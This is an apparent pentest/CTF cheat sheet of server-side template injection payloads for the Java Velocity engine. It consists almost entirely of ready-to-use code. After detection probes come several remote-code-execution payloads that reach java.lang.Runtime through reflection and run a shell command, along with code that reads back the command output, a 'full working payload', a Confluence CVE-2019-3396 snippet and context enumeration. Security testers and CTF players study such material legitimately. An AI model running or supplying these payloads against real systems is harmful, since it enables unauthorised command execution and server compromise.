# SSTI - Velocity (Java)

## Detection
```
#set($x=7*7)$x        → 49
$x.class
```

## RCE Payloads

### Using Runtime.exec
```
#set($e="exp")
#set($rt=$e.getClass().forName("java.lang.Runtime"))
#set($chr=$e.getClass().forName("java.lang.Character"))
#set($str=$e.getClass().forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Simpler Class Access
```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```

### Reading Command Output
```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$rt.getRuntime().exec("id"))
#set($in=$ex.getInputStream())
#set($isr=$class.inspect("java.io.InputStreamReader").type.getConstructor($in.getClass()).newInstance($in))
#set($br=$class.inspect("java.io.BufferedReader").type.getConstructor($isr.getClass()).newInstance($isr))
$br.readLine()
```

## Full Working Payload (common CTF form)
```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

## Confluence-Specific (CVE-2019-3396, common CTF/real-world target)
```
#set($a=42)
#if($a==42)
$context.class.forName("java.lang.Runtime")
#end
```

## Blind Detection
```
#set($x=7*7)
#if($x==49)true#end
```

## Context Object Enumeration
```
$context
$context.keys
```
